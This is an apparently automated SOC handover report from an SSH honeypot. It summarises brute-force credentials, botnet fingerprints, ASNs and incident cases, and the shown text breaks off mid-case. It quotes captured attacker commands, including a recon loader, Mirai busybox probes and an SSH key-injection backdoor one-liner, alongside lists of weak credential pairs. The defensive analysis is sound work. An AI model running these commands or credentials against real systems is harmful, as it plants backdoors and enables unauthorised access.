# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-15 |
| **Generated At** | 2026-07-15T21:05:13Z |
| **Shift Time** | 21:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **158** |
| Confirmed Threats | **131** |
| False Positives Filtered | **27** (17.1%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **25** |
| High Severity Cases | **92** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **112** |
| Unique Credential Pairs | **70** |
| Unique Usernames | **18** |
| Unique Passwords | **56** |
| Successful Auth Pairs | **100** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 43 |
| `admin` | 26 |
| `administrator` | 6 |
| `ubnt` | 5 |
| `guest` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `123456` | 7 |
| `!QAZxsw2` | 5 |
| `passwd` | 5 |
| `12345` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `!QAZxsw2` | 5 |
| `guest` | `123456` | 4 |
| `support` | `support` | 4 |
| `test` | `admin` | 4 |
| `root` | `vizxv` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwerty` | `92.118.39.77` | 2026-07-15T18:56:22 |
| `root` | `r00t` | `92.118.39.77` | 2026-07-15T18:58:17 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-15T19:00:32 |
| `root` | `root123` | `92.118.39.77` | 2026-07-15T19:03:54 |
| `root` | `q1q1q1` | `10.0.0.73` | 2026-07-15T19:04:37 |
| `ubuntu` | `***` | `103.61.122.229` | 2026-07-15T19:05:29 |
| `root` | `root@123` | `92.118.39.77` | 2026-07-15T19:05:38 |
| `root` | `!QAZxsw2` | `111.70.32.8` | 2026-07-15T19:05:46 |
| `root` | `!QAZxsw2` | `111.171.125.94` | 2026-07-15T19:05:54 |
| `root` | `rootme` | `92.118.39.77` | 2026-07-15T19:07:25 |
| `root` | `q1q1q1` | `185.242.3.195` | 2026-07-15T19:07:40 |
| `root` | `system` | `92.118.39.77` | 2026-07-15T19:09:12 |
| `root` | `!QAZxsw2` | `218.149.235.152` | 2026-07-15T19:09:19 |
| `root` | `!QAZxsw2` | `175.206.113.91` | 2026-07-15T19:09:29 |
| `root` | `!QAZxsw2` | `10.0.0.73` | 2026-07-15T19:09:46 |
| `root` | `toor` | `92.118.39.77` | 2026-07-15T19:11:24 |
| `root` | `welcome` | `92.118.39.77` | 2026-07-15T19:13:52 |
| `blank` | `passwd` | `10.0.0.73` | 2026-07-15T19:14:03 |
| `debian` | `passwd` | `122.117.30.20` | 2026-07-15T19:16:10 |
| `admin` | `111111` | `92.118.39.77` | 2026-07-15T19:16:54 |
| `admin` | `123123` | `92.118.39.77` | 2026-07-15T19:18:36 |
| `debian` | `passwd` | `10.0.0.73` | 2026-07-15T19:20:01 |
| `admin` | `1234` | `92.118.39.77` | 2026-07-15T19:21:01 |
| `admin` | `12345` | `92.118.39.77` | 2026-07-15T19:24:38 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-15T19:25:25 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-15T19:25:26 |
| `admin` | `123456` | `92.118.39.77` | 2026-07-15T19:26:27 |
| `admin` | `12345678` | `92.118.39.77` | 2026-07-15T19:28:09 |
| `admin` | `123456789` | `92.118.39.77` | 2026-07-15T19:29:43 |
| `admin` | `Admin123` | `92.118.39.77` | 2026-07-15T19:31:18 |
| `admin` | `Administrator` | `92.118.39.77` | 2026-07-15T19:33:18 |
| `guest` | `123456` | `65.20.161.126` | 2026-07-15T19:35:13 |
| `guest` | `123456` | `49.124.151.25` | 2026-07-15T19:35:23 |
| `guest` | `123456` | `10.0.0.73` | 2026-07-15T19:35:42 |
| `admin` | `P@ssw0rd` | `92.118.39.77` | 2026-07-15T19:36:34 |
| `admin` | `access` | `92.118.39.77` | 2026-07-15T19:38:59 |
| `user` | `qwerty1` | `218.21.241.50` | 2026-07-15T19:39:21 |
| `admin` | `admin` | `92.118.39.77` | 2026-07-15T19:40:52 |
| `admin` | `abc.123` | `106.13.181.87` | 2026-07-15T19:41:51 |
| `support` | `support` | `176.53.159.196` | 2026-07-15T19:41:58 |
| `admin` | `abc.123` | `185.81.94.58` | 2026-07-15T19:41:58 |
| `admin` | `admin123` | `92.118.39.77` | 2026-07-15T19:42:37 |
| `support` | `support` | `10.0.0.73` | 2026-07-15T19:43:15 |
| `yuanke` | `yuanke` | `185.242.3.195` | 2026-07-15T19:44:01 |
| `admin` | `admin@123` | `92.118.39.77` | 2026-07-15T19:44:37 |
| `admin` | `abc.123` | `10.0.0.73` | 2026-07-15T19:45:49 |
| `admin` | `adminadmin` | `92.118.39.77` | 2026-07-15T19:46:58 |
| `admin` | `letmein` | `92.118.39.77` | 2026-07-15T19:49:46 |
| `admin` | `passw0rd` | `92.118.39.77` | 2026-07-15T19:52:56 |
| `admin` | `password` | `92.118.39.77` | 2026-07-15T19:55:03 |
| `admin` | `password1` | `92.118.39.77` | 2026-07-15T19:56:46 |
| `yuanke` | `yuanke` | `10.0.0.73` | 2026-07-15T19:58:10 |
| `admin` | `qwerty` | `92.118.39.77` | 2026-07-15T19:58:38 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-15T19:59:54 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-15T19:59:54 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-15T19:59:57 |
| `ubnt` | `12345` | `45.178.227.0` | 2026-07-15T20:00:17 |
| `ubnt` | `12345` | `10.0.0.73` | 2026-07-15T20:00:27 |
| `test` | `admin` | `211.169.212.206` | 2026-07-15T20:01:06 |
| `test` | `admin` | `36.137.38.119` | 2026-07-15T20:01:16 |
| `administrator` | `123456` | `92.118.39.77` | 2026-07-15T20:01:28 |
| `root` | `admin` | `192.42.116.92` | 2026-07-15T20:01:28 |
| `root` | `Admin` | `103.61.122.229` | 2026-07-15T20:02:58 |
| `administrator` | `P@ssw0rd` | `92.118.39.77` | 2026-07-15T20:04:11 |
| `test` | `admin` | `203.252.10.4` | 2026-07-15T20:04:37 |
| `test` | `admin` | `58.17.6.119` | 2026-07-15T20:04:50 |
| `administrator` | `admin` | `92.118.39.77` | 2026-07-15T20:07:16 |
| `root` | `vizxv` | `217.24.185.98` | 2026-07-15T20:07:26 |
| `root` | `vizxv` | `192.34.128.202` | 2026-07-15T20:07:33 |
| `root` | `!QAZ2wsx1234` | `207.56.229.202` | 2026-07-15T20:08:16 |
| `345gs5662d34` | `345gs5662d34` | `207.56.229.202` | 2026-07-15T20:08:19 |
| `root` | `3245gs5662d34` | `207.56.229.202` | 2026-07-15T20:08:20 |
| `system` | `budda279056` | `46.29.26.195` | 2026-07-15T20:08:34 |
| `root` | `vizxv` | `118.122.196.230` | 2026-07-15T20:10:49 |
| `root` | `vizxv` | `210.177.143.61` | 2026-07-15T20:10:59 |
| `administrator` | `administrator` | `92.118.39.77` | 2026-07-15T20:12:05 |
| `administrator` | `password` | `92.118.39.77` | 2026-07-15T20:14:38 |
| `administrator` | `root` | `92.118.39.77` | 2026-07-15T20:17:04 |
| `skynet` | `skynet` | `36.104.144.114` | 2026-07-15T20:17:23 |
| `daniel` | `12345678` | `36.104.144.114` | 2026-07-15T20:20:34 |
| `boss` | `boss` | `10.0.0.73` | 2026-07-15T20:26:05 |
| `user` | `user1234` | `96.1.40.151` | 2026-07-15T20:26:22 |
| `user` | `user1234` | `125.35.109.214` | 2026-07-15T20:26:35 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-15T20:27:32 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-15T20:27:32 |
| `root` | `1234pass` | `36.104.144.114` | 2026-07-15T20:30:44 |
| `use` | `123456` | `14.29.208.128` | 2026-07-15T20:32:20 |
| `root` | `P@sswd!@#` | `185.242.3.195` | 2026-07-15T20:37:36 |
| `root` | `` | `94.154.43.92` | 2026-07-15T20:46:29 |
| `ubnt` | `admin123` | `211.22.222.251` | 2026-07-15T20:47:48 |
| `root` | `Passwd123$%^` | `112.197.2.116` | 2026-07-15T20:47:48 |
| `ubnt` | `admin123` | `24.97.253.246` | 2026-07-15T20:47:55 |
| `root` | `ab123456` | `103.146.159.173` | 2026-07-15T20:48:17 |
| `345gs5662d34` | `345gs5662d34` | `103.146.159.173` | 2026-07-15T20:48:21 |
| `root` | `3245gs5662d34` | `103.146.159.173` | 2026-07-15T20:48:23 |
| `root` | `Changeme!` | `103.86.180.10` | 2026-07-15T20:48:53 |
| `345gs5662d34` | `345gs5662d34` | `103.86.180.10` | 2026-07-15T20:48:57 |
| `root` | `3245gs5662d34` | `103.86.180.10` | 2026-07-15T20:48:58 |
| `root` | `P@sswd!@#` | `10.0.0.73` | 2026-07-15T20:51:45 |
| `admin` | `P@$$w0rd` | `183.89.208.174` | 2026-07-15T20:51:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **158** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 51 |
| libssh | 32 |
| OpenSSH | 26 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 35 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 24 | 24 |
| `f555226df196...` | Mirai/variant | 18 | 5 |
| `16443846184e...` | Generic scanner | 8 | 3 |
| `a2de0f306611...` | Mirai/variant | 8 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 35 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 24 | 24 | Mirai/variant |
| `f555226df196...` | libssh | 18 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 13 | 6 | — |
| `16443846184e...` | Go SSH scanner | 8 | 3 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 34 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.92`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `207.56.229.202`, `103.86.180.10`, `103.146.159.173`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **49** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS46562` | Performive LLC | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS3786` | LG DACOM Corporation | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (92)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-234b2c4253e7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 18:56 |
| **Last Seen** | 2026-07-15 18:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 18:56:20` | `cowrie.session.connect` |
| `2026-07-15 18:56:21` | `cowrie.client.version` |
| `2026-07-15 18:56:21` | `cowrie.client.kex` |
| `2026-07-15 18:56:22` | `cowrie.login.success` |
| `2026-07-15 18:56:23` | `cowrie.session.params` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.success` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:23` | `cowrie.command.input` |
| `2026-07-15 18:56:24` | `cowrie.log.closed` |
| `2026-07-15 18:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3943698c118b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 18:58 |
| **Last Seen** | 2026-07-15 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 18:58:16` | `cowrie.session.connect` |
| `2026-07-15 18:58:16` | `cowrie.client.version` |
| `2026-07-15 18:58:16` | `cowrie.client.kex` |
| `2026-07-15 18:58:17` | `cowrie.login.success` |
| `2026-07-15 18:58:18` | `cowrie.session.params` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.success` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.command.input` |
| `2026-07-15 18:58:18` | `cowrie.log.closed` |
| `2026-07-15 18:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcab7380e13c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:03 |
| **Last Seen** | 2026-07-15 19:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:03:52` | `cowrie.session.connect` |
| `2026-07-15 19:03:52` | `cowrie.client.version` |
| `2026-07-15 19:03:52` | `cowrie.client.kex` |
| `2026-07-15 19:03:54` | `cowrie.login.success` |
| `2026-07-15 19:03:56` | `cowrie.session.params` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.success` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.command.input` |
| `2026-07-15 19:03:56` | `cowrie.log.closed` |
| `2026-07-15 19:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-540ef05b0e3f

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-15 19:05 |
| **Last Seen** | 2026-07-15 19:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:05:28` | `cowrie.session.connect` |
| `2026-07-15 19:05:28` | `cowrie.client.version` |
| `2026-07-15 19:05:29` | `cowrie.client.kex` |
| `2026-07-15 19:05:29` | `cowrie.login.success` |
| `2026-07-15 19:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27263e46f8c3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:05 |
| **Last Seen** | 2026-07-15 19:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:05:37` | `cowrie.session.connect` |
| `2026-07-15 19:05:37` | `cowrie.client.version` |
| `2026-07-15 19:05:37` | `cowrie.client.kex` |
| `2026-07-15 19:05:38` | `cowrie.login.success` |
| `2026-07-15 19:05:39` | `cowrie.session.params` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.success` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.command.input` |
| `2026-07-15 19:05:39` | `cowrie.log.closed` |
| `2026-07-15 19:05:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c42c25dbb4e

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-07-15 19:05 |
| **Last Seen** | 2026-07-15 19:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:05:43` | `cowrie.session.connect` |
| `2026-07-15 19:05:44` | `cowrie.client.version` |
| `2026-07-15 19:05:44` | `cowrie.client.kex` |
| `2026-07-15 19:05:46` | `cowrie.login.success` |
| `2026-07-15 19:05:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad59ed0ec53

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-07-15 19:05 |
| **Last Seen** | 2026-07-15 19:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:05:52` | `cowrie.session.connect` |
| `2026-07-15 19:05:52` | `cowrie.client.version` |
| `2026-07-15 19:05:52` | `cowrie.client.kex` |
| `2026-07-15 19:05:54` | `cowrie.login.success` |
| `2026-07-15 19:05:55` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aedc425d5010

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:07 |
| **Last Seen** | 2026-07-15 19:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:07:23` | `cowrie.session.connect` |
| `2026-07-15 19:07:24` | `cowrie.client.version` |
| `2026-07-15 19:07:24` | `cowrie.client.kex` |
| `2026-07-15 19:07:25` | `cowrie.login.success` |
| `2026-07-15 19:07:27` | `cowrie.session.params` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.success` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:27` | `cowrie.command.input` |
